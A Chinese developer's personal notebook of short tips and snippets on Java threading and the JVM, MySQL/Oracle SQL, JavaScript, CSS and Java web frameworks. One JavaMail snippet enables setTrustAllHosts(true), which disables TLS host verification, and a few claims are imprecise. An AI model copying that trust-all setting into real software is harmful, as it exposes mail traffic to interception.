当任务的任务量均衡时,选择ThreadPoolExecutor往往更好,反之则选择ForkJoinPool

Java 8为ForkJoinPool添加了一个通用线程池,这个线程池用来处理那些没有被显式提交到任何线程池的任务
调整大小 makeCommonPool方法
-Djava.util.concurrent.ForkJoinPool.common.parallelism=N
--------------------------------------------------------------------------------------
当一个应用中存在多个线程时,该应用的加速指数(Speedup)可以通过阿姆达尔定律(Amdahl's Law)来计算：
Speedup = 1 / (( 1 - P ) + P / N)

https://github.com/destiny1020/java-learning-notes-cn/blob/master/Java%20Performance/9%20-%20Threading.md
--------------------------------------------------------------------------------------
线程同步有两方面的性能开销：1) 限制了应用的可扩展性；2) 获取锁的代价
--------------------------------------------------------------------------------------
Random,NumberFormat DateFormat 非线程安全
ThreadLocal对象不存在竞争
private static ThreadLocal<NumberFormat> nfLocal = new ThreadLocal<NumberFormat>() {
    public NumberFormat initialValue() {
        NumberFormat nf = NumberFormat.getInstance();
        nf.setMinimumIntegerDigits(2);
        return nf;
    }
};
--------------------------------------------------------------------------------------
CPU错误共享-->填充
当CPU中的缓存中有任何数据被更改时,其他CPU中持有相同区域内存的缓存也会无效,从而导致重新加载的行为

--------------------------------------------------------------------------------------
生成新的日志文件
flush logs

查看binlog大小(kb)
show master logs;

查看binlog日志文件
mysqlbinlog "C:\ProgramData\MySQL\MySQL Server 5.7\Data\my_local_binlog.000001"

删除部分binlog日志
根据日志名称删除，只删除log_name之前的日志，log_name本身不会被删除
purge {master|binary} logs to ‘log_name’;
purge master logs to 'my_local_binlog.000002';

根据日志生成的时间删除，只删除date之前的日志，date本身不会被删除
purge {master|binary} logs before ‘date’;

删除全部binlog日志
reset master;
--------------------------------------------------------------------------------------
System.nanoTime 系统计时器的当前值，以毫微秒为单位 只能用于测量已过的时间,可能为负
System.currentTimeMillis返回的是从1970.1.1 UTC 零点开始到现在的时间，精确到毫秒
--------------------------------------------------------------------------------------
oracle 查询版本
select * from v$version;
select * from nls_database_parameters;

--------------------------------------------------------------------------------------
使用unsigned int存储ipv4
select inet_aton('192.168.0.77')
select inet_ntoa(inet_aton('192.168.0.77'))

ipv6
select hex(inet6_aton('fdfe::5a55:caff:fefa:9089'));
select inet6_ntoa(inet6_aton('fdfe::5a55:caff:fefa:9089'))

判断ipv4 ipv6
select is_ipv4('10.0.5.9'),is_ipv6('fdfe::5a55:caff:fefa:9089')

update、delete语句不使用limit ，容易造成主从不一致

update test
set name =concat(name,'t_2')
order by id desc
limit 2

delete from  test
order by id desc
limit 2
--------------------------------------------------------------------------------------
mysql
int的类型范围是-2147483648-2147483647， Integer.max_value=2^31-1
int unsigned的范围类型就是0-4294967295
--------------------------------------------------------------------------------------
String内部是通过char数组表示，数组的长度在Java中限制为一个int型所能表示的最大值，
即Integer.MAX_VALUE = 0x7fffffff 2^31-1

--------------------------------------------------------------------------------------
MySQL 5.6版本开启GTID模式，必须打开参数log_slave_updates，简单来说就是必须在从机上再记录一份二进制日志
show variables like  '%log_slave_updates%'
内存值 select @@global.gtid_executed

mysql 5.7 表
select * from mysql.gtid_executed;

gtid 是对于一个已提交事务的编号，并且是一个全局唯一的编号
开启
show variables like 'gtid_mode'
show variables like 'log_slave_updates'
show variables like  'enforce_gtid_consistency'

show global variables like '%gtid%';
--------------------------------------------------------------------------------------
mybatis
默认statementType是PREPARED，由于PREPARED是默认编译一次，所以你的类型也就固定了，
STATEMENT则是每次都编译，另外STATEMENT不支持动态SQL，所以不能出现#{...}占位符
--------------------------------------------------------------------------------------
JDK7启动对xss参数有最小值要求，必须大于228才能启动JVM
修改这个： -Xss256k
--------------------------------------------------------------------------------------
jinfo -flags 4092

查看目前堆情况
jmap -heap pid

jcmd 4092 VM.flags
--------------------------------------------------------------------------------------
如果在Survivor空间中相同年龄所有对象大小的总和>Survivor空间的一半（ -XX:TargetSurvivorRatio）时，年龄>=该年龄的对象就可以直接进入年老代
eden from to
--------------------------------------------------------------------------------------
ueditor.all.min.js 解决插入图片默认会有title、alt属性
d.removeAttribute("title", a.title || ""), d.removeAttribute("alt", a.original || "")
--------------------------------------------------------------------------------------
response.addHeader("Pragma", "public");
response.addHeader("Cache-Control", "max-age=0");
--------------------------------------------------------------------------------------
m2e-wro4j 插件
使用wro4j压缩css js
http://fantaxy025025.iteye.com/blog/2288319
--------------------------------------------------------------------------------------
chrome://flags/ 线程式滚动 Threaded scrolling
--------------------------------------------------------------------------------------
jquery select
$("$districtSetor1").find(":contains('市属学校')")
--------------------------------------------------------------------------------------
构造器模式
function Person(name,age){
    this.name=name;
    this.age=age;
}
p1=Person('tom',20);
p2=new Person('mary',21);
console.log(p1);//undefined
console.log(p2);//Person {name: "mary", age: 21}
console.log(typeof p1);//undefined
console.log(typeof p2);//object

使用new则是将之当做构造函数来调用，会创建一个该类的实例对象
直接调用就是简单执行里面的代码，不会创建实例对象 this指向的调用环境下的this对象

工厂模式
function Person(name,age){
    var obj = new Object();
    obj.name=name;
    obj.age=age;
    return obj;
}
p3=Person('jim',20);
console.log(p3);//Object {name: "jim", age: 20}
console.log(typeof p3);//object
--------------------------------------------------------------------------------------
Date();不加new返回当前时间，是一个字符串加new的话，返回当前时间或者把参数格式化得到的时间，是一个Date对象
String():不加new将参数格式化为字符串，加new则返回的是String对象

var str1=new String("abc");
var str2=String("abc");
console.log(str1);//String {0: "a", 1: "b", 2: "c", length: 3, [[PrimitiveValue]]: "abc"}
console.log(str2);//abc
console.log(typeof str1);//object
console.log(typeof str2);//string
str1.prop = 1;
console.log(str1.prop);//1
str2.prop = 1;
console.log(str2.prop);//undefined
--------------------------------------------------------------------------------------
1. String没有提供任何方法来让你修改其成员
2. String是final类，你不能通过继承来修改其成员
--------------------------------------------------------------------------------------
final
1.引用不可变
2.引用指向的对象状态可变
3.引用类型声明为final存在线程安全问题
--------------------------------------------------------------------------------------
查看类的字节码
javap -verbose FinalParameter$1
--------------------------------------------------------------------------------------
WebService
优点
不依赖于语言，不依赖于平台，可以实现不同的语言间的相互调用
Web Service 可用基于 XML 的 SOAP 来表示数据和调用请求并且通过 HTTP 协议传输 XML 格式的数据
Web Service:属于应用层一种技术，通过服务器才可以发布，内部数据格式为xml格式，采用HTTP协议通信，Soap作为数据格式，是无状态的，因此可以不受防火墙的影 响

缺点
WebService使用了XML对数据封装

安全性：SOAP会好于restful

Socket:用来实现网络层一种协议 采用tcp或udp协议通信
Socket用的是字节流的方式，即双向不停地发送一个个字节，有利于实时更新数据；Socket效率最高

--------------------------------------------------------------------------------------
REST的适用场合
有限的带宽和资源
完全无状态的操作
缓存
--------------------------------------------------------------------------------------
SOAP(简单对象访问协议)
所有的SOAP消息发送都使用HTTP POST方法
基于XML的协议，

包括四个部分：
SOAP封装(envelop)，封装定义了一个描述消息中的内容是什么，是谁发送的，谁应当接受并处理它以及如何处理它们的框架；
SOAP编码规则（encoding rules），用于表示应用程序需要使用的数据类型的实例;
SOAP RPC表示(RPC representation)，表示远程过程调用和应答的协定;
SOAP绑定（binding），使用底层协议交换信息

SOAP的两个主要设计目标是简单性和可扩展性

--------------------------------------------------------------------------------------
struts2 是线程安全的，因为每次请求都会创建一个action对象，但是servlet不是线程安全的

--------------------------------------------------------------------------------------
修改struts后缀
struts.property
struts.action.extension=action,do,jspx,

struts.xml
<constant name="struts.action.extension" value="do"></constant>

--------------------------------------------------------------------------------------
jdk7中,String interned字符串放在堆中，不会放入permgen
jdk6中,String interned字符串放方法区常量池
--------------------------------------------------------------------------------------
解决幻读问题，innodb引入了gap锁
innodb首先会和RC级别一样，给索引上的记录添加上X锁，此外，还在非唯一索引’asd’与相邻两个索引的区间加上锁

区间锁(Gap Lock)
锁定索引记录间隙的锁,确保索引记录的间隙不变,间隙锁是针对事务隔离等级是可重复读(Repeatable Read)或以上级别而言的
防止其它事务的插入操作，以此来达到防止幻读的发生

禁止间隙锁的话，可以把隔离级别降为读已提交，或者开启参数innodb_locks_unsafe_for_binlog

--------------------------------------------------------------------------------------
mysql死锁
循环等待锁
delete from table_1 where id=1  update table1 set .. where token='b'
update table1 set .. where token='b' delete from table_1 where id=1

相同表记录行锁冲突
update  where id=1  update where id=2
update  where id=2  update where id=1
--------------------------------------------------------------------------------------
1.共享锁(S)
允许一个事务去读一行,阻止其他事务获得相同数据集的排他锁.
2.排他锁(X)
允许获得排他锁的事务更新数据,阻止其他事务取得相同数据集的共享读锁和排他写锁

1.意向共享锁(IS)
事务打算给数据行加行共享锁,事务在给一个数据行加共享锁前必须先取得该表的IS锁.
2.意向排他锁(IX)
事务打算给数据行加行排他锁,事务在给一个数据行加排他锁前必须先取得该表的IX锁

1.共享锁(S)
    select * from test where id < 2 lock in share mode

2.排他锁(X)
    select * from test where id < 2 for update


--------------------------------------------------------------------------------------
MySQL的两种read方式
1.快照读(snapshot read或者consistent read)
快照读,读取的是记录的可见版本(有可能是历史版本),不用加锁;

通常,简单的select操作,属于快照读,不加锁,比如:
select * from table where ?

2.当前读(current read或者lock read)
当前读,读取的是记录的最新版本,并且,当前读返回的记录,都会加上锁,保证其他事务不会再并发修改这条记录.

特殊的读操作,插入/更新/删除操作,属于当前读,需要加锁.比如:
select * from table where ? lock in share mode
select * from table where ? for update
insert into table values (…)
update table set ? where ?
delete from table where ?

在Read Committed级别下,快照读总是读取被锁定行的最新的快照数据.
在Repeatable Read和Serializable级别,快照读读取的是事物开始时候的行数据版本

--------------------------------------------------------------------------------------
InnoDB有三种类型的行锁:record locks,gap locks和next-key locks:
索引锁是在单个索引记录上的锁;
区间锁是两个索引记录之间的锁,或者第一个索引之前的锁,或者最后一个索引之后的锁;
Next-Key锁是索引锁和该索引之前的gap锁的结合.

InnoDB扫描的是一个主键、或是一个唯一索引的话，那InnoDB只会采用行锁方式来加锁，而不会使用Next-Key Lock的方式，也就是说不会对索引之间的间隙加锁

--------------------------------------------------------------------------------------
查看栈大小
java -XX:+PrintFlagsFinal -version | grep ThreadStackSize

--------------------------------------------------------------------------------------
JVM内存上限
-Xms1024m -Xmx1024m -XX:PermSize=256m

堆(Heap)的大小1G,永久代大小256M
64位的操作系统(Linux服务器),线程的栈空间大小最大为1M

1. 堆内存
2. 持久代
3. 线程栈空间
4. 堆外内存
--------------------------------------------------------------------------------------
Linux 内核有个机制叫OOM killer(Out-Of-Memory killer)，
该机制会监控那些占用内存过大，尤其是瞬间很快消耗大量内存的进程,
为了防止内存耗尽而内核会把该进程杀掉,从而腾出内存留给系统用

--------------------------------------------------------------------------------------
1.查询之前,先执行count查询,当count为0,即crate中没有满足我们查询条件的数据,则直接返回空数据集;
2.分页查询的时候,先执行count查询,当分页的offset大于等于count,则值直接返回空数据集;
--------------------------------------------------------------------------------------
MessageDigest
digest()这个方法只能被调用一次，一旦调用MessageDigest对象会被重置到初始状态
digest前使用clone
--------------------------------------------------------------------------------------
Enum单例 处理序列化
在序列化的时候Java仅仅是将枚举对象的name属性输出到结果中，反序列化的时候则是通过java.lang.Enum的valueOf方法来根据名字查找枚举对象同时，编译器是不允许任何对这种序列化机制的定制的，因此禁用了writeObject、readObject、readObjectNoData、writeReplace和readResolve
JVM对序列化有保证
枚举实例创建是thread-safe(线程安全的)
--------------------------------------------------------------------------------------
字节流：字节流以字节(8bits)为单位进行读写字节流的类都是InputStream和OutputStream类的子类
字符流：字符流则以字符(16bits)为单位进行读写字符流的类都是Reader和Writer类的子类

字节流和字符流的转换
InputStreamReader：将输入的字节流转为字符流
OutputStreamWriter：将输出的字符流转为字节流
--------------------------------------------------------------------------------------
Externalizable需要无参public构造函数 覆盖Serializable
public void writeExternal(ObjectOutput out) throws IOException
public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException

Serializable
private void writeObject(ObjectOutputStream out) throws IOException
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
--------------------------------------------------------------------------------------
有writeUTF writeBytes writeChars,readUTF无readBytes readChars
writeUTF方法在写入字符串时就写好了字符串的长度，而writeBytes和writeChars则没有

--------------------------------------------------------------------------------------
触发连接池实例化
<bean id="dataSource"
      class="org.logicalcobwebs.proxool.ProxoolDataSource" init-method="getConnection">

--------------------------------------------------------------------------------------
A%B=A-(A/B)* B

-11 % -7=-4

--------------------------------------------------------------------------------------
function toThousands(num) {
	var num = (num || 0).toString(), result = '';
	while (num.length > 3) {
		result = ',' + num.slice(-3) + result;
		num = num.slice(0, num.length - 3);
	}
	if (num) { result = num + result; }
	return result;
}
--------------------------------------------------------------------------------------
函数声明：function fnName () {…};使用function关键字声明一个函数，再指定一个函数名，叫函数声明
函数表达式 var fnName = function () {…};使用function关键字声明一个函数，但未给函数命名，最后将匿名函数赋予一个变量，叫函数表达式
匿名函数：function () {};

函数声明提升
fnName();
function fnName(){
    ...
}

函数表达式后面可以加括号立即调用该函数，函数声明不可以，只能以fnName()形式调用
var fnName=function(){
    alert('Hello World');
}();


-function(a){
    console.log(a);   //1234567,使用-运算符
}(1234567);


var fn=function(a){
    console.log(a);   //12345678，使用=运算符
}(12345678)
在function前面加！、+、 -甚至是逗号等到都可以起到函数定义后立即执行的效果，而（）、！、+、-、=等运算符，都将函数声明转换成函数表达式

( function(){…} )()内部定义的变量不会和外部的变量发生冲突，俗称匿名包裹器

--------------------------------------------------------------------------------------
自旋锁流程：
获取自旋锁时，如果没有任何线程保持该锁，那么将立即得到锁；
如果在获取自旋锁时锁已经有保持者，那么获取锁操作将自旋在那里，直到该自旋锁的保持者释放了锁

AtomicReference实现的基本原理是使用volatile关键字和Unsafe类来保证其可见性和原子性

--------------------------------------------------------------------------------------
阻塞锁和自旋锁最大的区别就在于，
当获取锁是，如果锁有持有者，当前线程是进入阻塞状态，等待当前线程结束而被唤醒的

阻塞锁，可以说是让线程进入阻塞状态进行等待，当获得相应的信号（唤醒，时间）时，
才可以进入线程的准备就绪状态，准备就绪状态的所有线程，通过竞争，进入运行状态

synchronized 关键字（其中的重量锁），
ReentrantLock，Object.wait()\notify(),
LockSupport.park()/unpart()(j.u.c经常使用)

阻塞的线程不会占用cpu时间， 不会导致 CPu占用率过高，但进入时间以及恢复时间都要比自旋锁略慢

synchronized是一个典型的非公平锁

--------------------------------------------------------------------------------------
sun.misc.Unsafe：直接修改内存值，绕过构造器，直接调用类方法
Unsafe是final类 构造器是私有的，也不能实例化 保存了一个静态私有不可改变的实例“theUnsafe”
提供了一个静态方法getUnsafe()来获取这个类的实例

--------------------------------------------------------------------------------------
重入锁，也叫做递归锁，
指的是同一线程外层函数获得锁之后 ，内层递归函数仍然有获取该锁的代码，但不受影响
ReentrantLock和synchronized都是重入锁

可重入锁最大的作用是避免死锁
--------------------------------------------------------------------------------------
自适应自旋锁—>阻塞锁
偏向锁—>轻量锁—>重量锁
--------------------------------------------------------------------------------------
jdk动态代理
被代理的类要求至少实现了一个Interface;
被代理的类要求有public的构造函数

机制是利用反射机制生成
--------------------------------------------------------------------------------------
cglib 默认情况下生成的代理class文件只存储在内存

Class Generator(比如这里的Enhancer)都继承自AbstractClassGenerator
(实现接口ClassGenerator，这个接口只有一个generateClass的方法)
generateClassName()方法用来生成Class名称

cglib
1.private方法无法代理；
2.final方法无法代理;

--------------------------------------------------------------------------------------
linux 进制转换
echo $((010))  8
echo $((0x10)) 16
echo $((2#10)) 2 2-64进制

printf "%d\n" 0x10  16
printf "%X\n" 100  64


--------------------------------------------------------------------------------------
mysql
thread_pool_size的命令可能会让大家产生误解，它不是指的线程池的大小，而是线程组的大小
活跃的最大worker线程数=thread_pool_size * (thread_pool_oversubscribe + 1)
--------------------------------------------------------------------------------------
BufferedInputStream默认buffer大小为8K
BufferedOutputStream默认buffer大小为8K
--------------------------------------------------------------------------------------
javax.net.debug=all开启网络相关的全部调试信息
svnkit的协议配置是通过svnkit.http.sslProtocols这个参数指定的
TLSv1
--------------------------------------------------------------------------------------
spring 方法注入
Lookup method injection（查找方法注入）
替换方法注入：也叫MethodReplacer注入
--------------------------------------------------------------------------------------
查看是否支持字符集
show charset like 'utf8mb4';
--------------------------------------------------------------------------------------
指定长度数组
var numbersArray = [] , max = 100;

for( var i=1; numbersArray.push(i++) < max;);

字符串(数字字母)
function generateRandomAlphaNum(len) {

    var rdmString = "";

    for( ; rdmString.length < len; rdmString  += Math.random().toString(36).substr(2));

    return  rdmString.substr(0, len);

}
--------------------------------------------------------------------------------------
var squares = [1,2,3,4].map(function (val) {
    return val * val;
});
--------------------------------------------------------------------------------------
执行一次函数
function once(fn, context) {
    var result;

    return function() {
        if(fn) {
            result = fn.apply(context || this, arguments);
            fn = null;
        }

        return result;
    };
}

var canOnlyFireOnce = once(function() {
    console.log('Fired!');
});
--------------------------------------------------------------------------------------
获取绝对url
var getAbsoluteUrl = (function() {
    var a;

    return function(url) {
        if(!a) a = document.createElement('a');
        a.href = url;

        return a.href;
    };
})();

getAbsoluteUrl('/shirlyzhang');

获取当前页面 URL
document.URL
--------------------------------------------------------------------------------------
document.getElementById(): 只能运用到document上, 返回找到的元素节点, 速度是最快的
--------------------------------------------------------------------------------------
chrome支持小于 12px
p span{font-size:10px;-webkit-transform:scale(0.8);display:block;} 缩放

ios手机浏览器字体齿轮
-webkit-font-smoothing: none: 无抗锯齿
-webkit-font-smoothing: antialiased(灰阶平滑) | subpixel-antialiased | default: 灰度平滑

chrome记住密码后自动填充表单的黄色背景
input:-webkit-autofill {
background-color: #FAFFBD;
background-image: none;
color: #000;
}

--------------------------------------------------------------------------------------
IE6 两个并发，iE7升级之后的6个并发，之后版本也是6个
Firefox，chrome也是6个
--------------------------------------------------------------------------------------
// 判断浏览器是否支持placeholder属性
supportPlaceholder='placeholder'in document.createElement('input')
--------------------------------------------------------------------------------------
直接创建一个新img对象，然后把旧img的src赋值给新的，获取新img的宽度即可
function getNaturalWidth(img) {
    var image = new Image()
    image.src = img.src
    var naturalWidth = image.width
    return naturalWidth
}

if (img.naturalWidth) { // 现代浏览器
    nWidth = img.naturalWidth
    nHeight = img.naturalHeight
}
--------------------------------------------------------------------------------------
不断监测img的complete属性，如果为true则表明图片已经加载完毕，停止轮询该属性所有浏览器都支持
img的load事件
--------------------------------------------------------------------------------------
事件A表示:“小孩说谎”；事件B表示:“小孩可信”
P(B/A)=[P(A/B)*P(B)]/[P(A/B)*P(B)+P(A/^B)*P(^B)]
       =(0.1*0.8)/[0.1*0.8+0.5*(1-0.8)]
       =0.444
P(B)=0.444, P(^B)=1- P(B)=0.556
--------------------------------------------------------------------------------------
oracle
number的默认值是38，number的范围是（1~38）varchar2没有默认值，必须指定长度
--------------------------------------------------------------------------------------
mysql
null
select concat_ws(null,'11','22','33');
11,22,33
select concat_ws(',','11','22','33');
11,22,33
select concat_ws(',','11','22',NULL,'33');

abab
select repeat('ab',2);

0000a
select lpad('a', 5, '0')
a0000
select rpad('a', 5, '0')


oracle
0000a
select lpad('a', 5, '0') from dual;
a0000
select rpad('a', 5, '0')  from dual;
--------------------------------------------------------------------------------------
查看字体fc-list
--------------------------------------------------------------------------------------
struts禁用动态方法调用
<constant name="struts.enable.DynamicMethodInvocation" value"false"/>
--------------------------------------------------------------------------------------
MimeUtility
--------------------------------------------------------------------------------------
http://www.cnblogs.com/anmoon/archive/2010/08/15/1799968.html ISO-2022-CN
--------------------------------------------------------------------------------------
testng的expectedExceptionsMessageRegExp来匹配抛出的异常message是否是预期
@Test(expectedExceptions = MyException.class, expectedExceptionsMessageRegExp = ".*error-code-1001.*")
public void testcaseOne() {
    System.out.println("test expectedExceptionsMessageRegExp.");
    throw new MyException(“error-code-1001”，“系统错误”);
}
--------------------------------------------------------------------------------------
AccessController.doPrivileged意思是这个是特别的,不用做权限检查
--------------------------------------------------------------------------------------
Class.getResource(String path)
path不以’/'开头时，默认是从此类所在的包下取资源；
path  以’/'开头时，则是从ClassPath根下获取；  resolveName处理了/开头的情况

Class.getClassLoader().getResource(String path)
path不能以’/'开头时；
path是从ClassPath根下获取；

class.getResource("/") == class.getClassLoader().getResource("")

--------------------------------------------------------------------------------------
jvm主体是C++写的，jni部分是C，工具类是Java写的 缓冲区溢出 攻击
--------------------------------------------------------------------------------------
jdk8
-XX:CompressedClassSpaceSize
-XX:InitialBootClassLoaderMetaspaceSize
-XX:MaxMetaspaceSize来设置触发metaspace回收的阈值
--------------------------------------------------------------------------------------
-Xss或者-XX:ThreadStackSize来设置java线程栈的大小
--------------------------------------------------------------------------------------
.metadata\.plugins\org.eclipse.core.resources\.projects
--------------------------------------------------------------------------------------
http://yjph83.iteye.com/blog/2295260
nio2
4.高效的访问metadata信息
5.递归查找文件树，文件扩展搜索
6.文件系统修改通知机制
7.File类操作API兼容
8.文件随机访问增强 mapping a region,locl a region,绝对位置读取

--------------------------------------------------------------------------------------
spring security4
可以在pathvariable形式的URL中进行保护
<intercept-url pattern="/user/{userId}/**"
access="@webSecurity.checkUserId(authentication,#userId)"/>

支持Content Security Policy (CSP)  减少XSS的发生
--------------------------------------------------------------------------------------
hibernate 5
final StandardServiceRegistry registry = new StandardServiceRegistryBuilder()
  .configure() // configures settings from hibernate.cfg.xml
  .build();
sessionFactory = new MetadataSources( registry ).buildMetadata().buildSessionFactory();
Session session =sessionFactory.openSession();
--------------------------------------------------------------------------------------
oracle nvarchar2 编码范围比varchar2广

varchar：汉字全角等字符占2字节，数字、字母均1个字节
varchar2：一般所有字符都占2个字符处理，主要也看数据库的编译格式
    GBK ：汉字占2字节，英文1字节  select lengthb('才') from dual
    UTF-8：汉字3字节，英文1字节

查看oracle 编码格式
select userenv('language') from dual;

varchar2 空串=null varchar类型的空串就按''空串处理

nvarchar类型中文2字节  英文1字节 可变长度 Unicode 字符数据
nvarchar2：字符均按2字节计算  varchar2适合存储英文

nvarchar2和varchar2的区别
1、nvarchar2(10)-->10中/10英 (nvarchar’2‘适合存储中文)
2、varchar2(10) -->最多5中/10英  适合存储英文

select rawtohex('才'), rawtohex(chr('63959')) from dual

oracle支持unicode的字符集主要有uft8,al32utf8和al16utf16

--------------------------------------------------------------------------------------
tomcat/conf/web.xml
<init-param>
    <param-name>modificationTestInterval</param-name>
    <param-value>0</param-value>
</init-param>
<init-param>
    <param-name>development</param-name>
    <param-value>true</param-value>
</init-param>

<servlet>
    <servlet-name>jsp</servlet-name>
    <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
    <init-param>
        <param-name>modificationTestInterval</param-name>
        <param-value>60000</param-value>
    </init-param>
    <load-on-startup>3</load-on-startup>
</servlet>
--------------------------------------------------------------------------------------
http://my.oschina.net/kyo153/blog/667385 spring注入
PropertyPathFactoryBean用来获得目标Bean的属性值（实际上就是调用getter方法返回的值），获得的值可以注入给其他的Bean，也可以直接定义新的Bean
--------------------------------------------------------------------------------------
TimeZone.getTimeZone("GMT+08") 不要混用
TimeZone.getTimeZone("GMT+0800")
--------------------------------------------------------------------------------------
 -Djdk.lang.Process.allowAmbigousCommands=false，这样java就不会执行本地进程

--------------------------------------------------------------------------------------
Could not initialize class sun.awt.X11GraphicsEnvi 解决
-Djava.awt.headless=true
System.setProperty("java.awt.headless","true");
--------------------------------------------------------------------------------------
http://my.oschina.net/passer007/blog/669400 获取SQL查询结果集中的行数和列数
--------------------------------------------------------------------------------------
log4j servlet启动
 BasicConfigurator.configure();  //或路径
--------------------------------------------------------------------------------------
https://github.com/houweitao/DownloadXiaMi
--------------------------------------------------------------------------------------
http://my.oschina.net/u/140406/blog/669069 oracle 限制特定ip登录
配置sqlnet.ora文件 （$ORACLE_HOME/network/admin）目录下面
tcp.validnode_checking=yes  --打开ip检查
tcp.invited_nodes=(ip,ip) 可以连通数据库的ip
--------------------------------------------------------------------------------------
http://my.oschina.net/HiWeber/blog/669904 md5 大(32) 小(16)
--------------------------------------------------------------------------------------
 spring提供的多功能控制器，可以使多个动作合并到一个控制器中
org.springframework.web.servlet.mvc.multiaction.MultiActionController

--------------------------------------------------------------------------------------
mysql占位符 最高限制65535
select concat('1001,1002', ',') regexp concat(replace('1001,1003,1002',',',',|'), ',')

--------------------------------------------------------------------------------------
http://colobu.com/2016/05/04/check-latest-dependencies-in-pom-xml/
更新Maven POM文件中依赖库的版本 versions-maven-plugin

mvn versions:display-property-updates
--------------------------------------------------------------------------------------
update语句后必须携带where条件
show variables like 'sql_safe_updates';

sql_safe_updates=1,即开启

set sql_safe_updates='OFF'

--------------------------------------------------------------------------------------
非int类型列的数据在跟int类型比较时会将其转型为int类型，结果cast成了默认值0

select * from t_user_2 where name=0 (name字符串类型0
--------------------------------------------------------------------------------------
mysql填充 test_201605080055
select  concat('test_', date_format(now(), '%Y%m%d'),lpad(max(id)+1, 4,'0'))
from t_user_2
--------------------------------------------------------------------------------------
<a>标签href属性，根据元素id，定位元素位置
<a href="#1">接口文档1</a>
--------------------------------------------------------------------------------------
show variables like '%gtid%';

enforce-gtid-consistency = ON
gtid的局限性(mysql 5.6)
create table ..... select语句不支持
必须开启enforce-gtid-consistency参数
--------------------------------------------------------------------------------------
mysql主键或唯一
忽略重复
insert ignore into t_user_3(name)  select  name from t_user_2

group_concat_max_len=102400;
--------------------------------------------------------------------------------------
MailSSLSocketFactory sf = new MailSSLSocketFactory();
sf.setTrustAllHosts(true);
// or
// sf.setTrustedHosts(new String[] { "my-server" });
props.put("mail.smtp.ssl.enable", "true");
// also use following for additional safety
//props.put("mail.smtp.ssl.checkserveridentity", "true");
props.put("mail.smtp.ssl.socketFactory", sf);
--------------------------------------------------------------------------------------
$('#xf-danjia, #xf-mianji, #my-averprice, #my-buildarea').blur(function(){
    var val = $.trim($(this).val());
    if(val && isNaN(val)){
        error();
        $(this).focus().val('');
    }
});
--------------------------------------------------------------------------------------
table{
　　table-layout: fixed;
}

td{
　　white-space:nowrap;
    text-overflow:ellipsis;
    -o-text-overflow:ellipsis;
    overflow:hidden;
}
--------------------------------------------------------------------------------------
//检查所有明细表中XX项目是否有重复
var checkResult = true;
//对于所有id以serviceId为开头的元素进行判断
$("[id^='serviceId']").each(function () {
    var orginValue = $(this);
    $("[id^='serviceId']").not(orginValue).each(function () {
        if (orginValue.val() == $(this).val()){
            //错误提示信息处理
            alert('XX列表中选择了重复的XX项目，请修正！');
            checkResult = false;
            return false;
        }
    });
    if(!checkResult){
        return false;
    }
});
--------------------------------------------------------------------------------------
//时间戳转换
function get_unix_time(dateStr)
{
    var newstr = dateStr.replace(/-/g,'/');
    var date =  new Date(newstr);
    var time_str = date.getTime().toString();
    return time_str.substr(0, 10);
}
--------------------------------------------------------------------------------------
https://github.com/open-eid/digidoc4j

--------------------------------------------------------------------------------------
oracle timestamp可以精确到毫秒，毫秒的位数为0-9位，默认为6位
with local time zone以数据库本地时区保存数据，输出时将转换成客户端时区输出

create table timestamp_test(
dt date,tp timestamp(6)
,tp_tz timestamp(6) with time zone,
tp_l_tz timestamp(6) with local time zone);

insert into timestamp_test values(sysdate,sysdate,sysdate,sysdate);

查看数据库的时区和当前会话的时区
select dbtimezone,sessiontimezone from dual;

--------------------------------------------------------------------------------------
po是持久化对象，对应数据库表； vo是指值对象，在业务逻辑层之间可以独立出来的对象
--------------------------------------------------------------------------------------
<context-param>
    <param-name>org.apache.tomcat.websocket.textBufferSize</param-name>
    <param-value>5242800</param-value>
</context-param>
--------------------------------------------------------------------------------------
jquery
$(selector).after(content) 在被选元素后插入指定的内容

$(selector).append(content) 在被选元素的结尾（仍然在内部）插入指定内容

$(content).appendTo(selector) 在被选元素的结尾（仍然在内部）插入指定内容
--------------------------------------------------------------------------------------
hr{
    display: block;
    height: 1px;
    border: 0;
    border-top: 1px solid #bbe;
    margin: 0;
    padding: 0;
}
--------------------------------------------------------------------------------------
http://www.dexcoder.com/dexcoder/article/4578
--------------------------------------------------------------------------------------
https://github.com/DiUS/java-faker

--------------------------------------------------------------------------------------
function parseUrl() {
  var arr = location.search.split('?')[1].split('&');
  var params = {};
  for (var i = 0, l = arr.length; i < l; i++) {
    var param = arr[i].split('=');
    params[param[0]] = param[1];
  }
  return params;
}
--------------------------------------------------------------------------------------
Could not find optional Type javax.xml.datatype.XMLGregorianCalendar. Skipping.
--------------------------------------------------------------------------------------
<select  useCache="false"> 禁用二级缓存:
--------------------------------------------------------------------------------------
["1", "2", "3"].map(parseInt) 1 NAN NAN
主要是parseInt的第二个参数，是解析数字的基数，也就是进制，范围为2~36
第二个运行结果 就是 parseInt('2',1);  参数不符 故是NAN
parseInt('3',2); 二进制里没有3，所以也是NAN

--------------------------------------------------------------------------------------
null，array的 typeof 都是object

var s2=new String('hello')
typeof s2  object

--------------------------------------------------------------------------------------
String('123') instanceof String false
new String('123') instanceof String true
'123' instanceof String false
--------------------------------------------------------------------------------------
js最大的数是2^53
--------------------------------------------------------------------------------------
switch 用 === 进行枚举
--------------------------------------------------------------------------------------
var a= 3 + '5'-3   32 遇到减号时，会先转换为数值类型
--------------------------------------------------------------------------------------
this只在执行时才会绑定
--------------------------------------------------------------------------------------
原型链继承问题：
1.出现引用共享问题，他们还是共用一个空间，子类会影响父类

--------------------------------------------------------------------------------------
寄生组合式继承
--------------------------------------------------------------------------------------
https://leohxj.gitbooks.io/front-end-database/content/html-and-css-basic/index.html
--------------------------------------------------------------------------------------
http://note.youdao.com/share/index.html?id=84d58589eb42134bbf4aea1bff26934f&type=note#/
--------------------------------------------------------------------------------------
LinkedBlockingQueue 默认创建Integer.MAX_VALUE大小
LinkedBlockQueue里不允许存放Null元素
ArrayBlockQueue是必须指定队列容量 放和取是互斥
--------------------------------------------------------------------------------------
var args = Array.prototype.slice.call(arguments);
var func = User.getCount.bind(User);
--------------------------------------------------------------------------------------
$('a').each(function(){
   alert($(this).attr('href'));
});
--------------------------------------------------------------------------------------
var a = 1;
a.a = 2;
console.log(a.a); //undefined

var a = {n:1};
var b = a;
a.x = a = {n:2};
alert(a.x);// --> undefined  .运算优先级高于=运算符，所以会先创建a.x对象，然后在执行赋值过程赋值顺序从右向左
